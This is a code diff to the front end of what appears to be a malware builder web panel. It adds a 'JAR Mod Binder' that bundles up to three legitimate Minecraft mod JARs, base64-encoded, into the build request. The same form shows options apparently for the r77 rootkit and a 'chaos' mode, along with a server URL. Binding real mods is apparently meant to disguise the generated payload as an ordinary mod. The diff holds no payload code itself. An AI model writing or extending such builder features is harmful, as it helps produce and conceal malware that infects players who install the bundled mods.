@@ -539,6 +539,69 @@ if (bindFileInput) {
   });
 }
 
+// ── JAR Mod Binder ────────────────────────────────────────────────────────────
+const MAX_JAR_BOUND_MODS = 3;
+let jarBoundMods = []; // { name, base64 }
+
+const jarBindFileInput = document.getElementById("jar-bind-file-input");
+const jarBoundModsList = document.getElementById("jar-bound-mods-list");
+const jarBindAddLabel = document.getElementById("jar-bind-add-label");
+
+function renderJarBoundMods() {
+  if (!jarBoundModsList) return;
+  jarBoundModsList.innerHTML = "";
+  jarBoundMods.forEach((mod, idx) => {
+    const div = document.createElement("div");
+    div.className = "flex items-center justify-between gap-2 px-2 py-1.5 bg-slate-800/60 border border-slate-700 rounded text-xs";
+    div.innerHTML = `<span class="text-slate-300 truncate flex-1"><i class="fa-brands fa-java text-green-400 mr-1"></i>${mod.name}</span>
+      <button type="button" class="jar-mod-remove text-red-400 hover:text-red-300 px-1" data-idx="${idx}" title="Remove">✕</button>`;
+    div.querySelector(".jar-mod-remove").addEventListener("click", () => {
+      jarBoundMods.splice(idx, 1);
+      renderJarBoundMods();
+      updateJarBindAddVisibility();
+    });
+    jarBoundModsList.appendChild(div);
+  });
+}
+
+function updateJarBindAddVisibility() {
+  if (!jarBindAddLabel) return;
+  jarBindAddLabel.classList.toggle("hidden", jarBoundMods.length >= MAX_JAR_BOUND_MODS);
+}
+
+if (jarBindFileInput) {
+  jarBindFileInput.addEventListener("change", () => {
+    const file = jarBindFileInput.files[0];
+    jarBindFileInput.value = "";
+    if (!file) return;
+    if (jarBoundMods.length >= MAX_JAR_BOUND_MODS) {
+      alert(`Maximum ${MAX_JAR_BOUND_MODS} JAR mods can be bound.`);
+      return;
+    }
+    if (!file.name.toLowerCase().endsWith(".jar")) {
+      alert("Only .jar files can be bound as mods.");
+      return;
+    }
+    if (file.size > MAX_BIND_FILE_BYTES) {
+      alert(`Bound mod must be under 10 MB. "${file.name}" is too large.`);
+      return;
+    }
+    const safeName = sanitizeBindName(file.name);
+    if (jarBoundMods.some((m) => m.name === safeName)) {
+      alert(`A mod named "${safeName}" is already in the list.`);
+      return;
+    }
+    const reader = new FileReader();
+    reader.onload = () => {
+      const base64 = reader.result.split(",")[1];
+      jarBoundMods.push({ name: safeName, base64 });
+      renderJarBoundMods();
+      updateJarBindAddVisibility();
+    };
+    reader.readAsDataURL(file);
+  });
+}
+
 async function init() {
   try {
     updateServerUrlPlaceholder();
@@ -722,6 +785,7 @@ form?.addEventListener("submit", async (e) => {
     jarMcVersion: document.getElementById("jar-mc-version")?.value || "1.21.4",
     jarModId: document.getElementById("jar-mod-id")?.value?.trim() || undefined,
     jarModName: document.getElementById("jar-mod-name")?.value?.trim() || undefined,
+    jarBoundMods: jarBoundMods.length > 0 ? jarBoundMods.map((m) => ({ name: m.name, data: m.base64 })) : undefined,
     enableR77: form.querySelector('input[name="enable-r77"]')?.checked || false,
     enableChaos: form.querySelector('input[name="enable-chaos"]')?.checked || false,
     chaosMode: document.querySelector('input[name="chaos-mode"]:checked')?.value || "both",
